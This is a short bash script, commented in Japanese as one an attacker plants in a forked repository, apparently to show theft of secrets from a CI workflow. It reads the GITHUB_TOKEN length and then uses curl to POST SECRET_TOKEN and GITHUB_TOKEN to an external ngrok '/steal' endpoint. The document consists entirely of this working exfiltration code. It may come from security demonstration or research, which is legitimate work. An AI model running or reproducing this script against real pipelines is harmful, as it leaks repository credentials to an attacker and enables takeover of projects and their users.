#!/bin/bash
# 攻撃者がフォークに仕込むスクリプト

# GITHUB_TOKEN の長さを確認（値が存在するかチェック）
TOKEN_LEN=${#GITHUB_TOKEN}
echo "GITHUB_TOKEN length: ${TOKEN_LEN}"

curl -s -X POST https://seema-unhumoured-eximiously.ngrok-free.dev/steal \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "secret=${SECRET_TOKEN}&token_len=${TOKEN_LEN}&github_token=${GITHUB_TOKEN}"
